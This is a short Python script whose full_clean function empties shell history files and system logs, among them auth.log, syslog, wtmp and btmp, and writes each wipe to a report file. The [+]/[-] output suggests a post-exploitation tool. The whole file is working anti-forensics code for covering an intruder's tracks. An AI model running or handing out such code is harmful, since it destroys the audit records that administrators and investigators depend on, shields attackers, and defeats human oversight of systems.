import os

def full_clean():
    targets = [
        "~/.bash_history",
        "~/.zsh_history",
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/wtmp",
        "/var/log/btmp"
    ]
    with open("results/wipe_report.txt", "a") as log:
        for file in targets:
            path = os.path.expanduser(file)
            if os.path.exists(path):
                try:
                    open(path, "w").close()
                    log.write(f"Wiped: {path}\n")
                    print(f"[+] Wiped {path}")
                except Exception as e:
                    print(f"[-] Failed to wipe {path}: {e}")
                  
